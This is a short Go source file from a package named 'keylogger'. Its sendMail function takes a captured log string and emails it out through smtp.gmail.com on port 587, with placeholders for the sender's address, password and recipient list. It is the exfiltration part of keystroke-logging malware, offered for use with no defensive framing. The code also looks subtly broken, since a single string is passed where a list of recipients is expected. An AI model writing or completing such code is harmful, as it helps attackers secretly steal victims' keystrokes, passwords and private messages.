package keylogger

import (
	"net/smtp"
)

func sendMail(logString string) {
	from := "<YOUR MAIL>"
	password := "<YOUR PASSWORD MAIL>"

	toList := "<LIST DEST MAIL>"

	host := "smtp.gmail.com"

	port := "587"

	msg := logString

	body := []byte(msg)

	auth := smtp.PlainAuth("", from, password, host)

	go smtp.SendMail(host+":"+port, auth, from, toList, body)
}
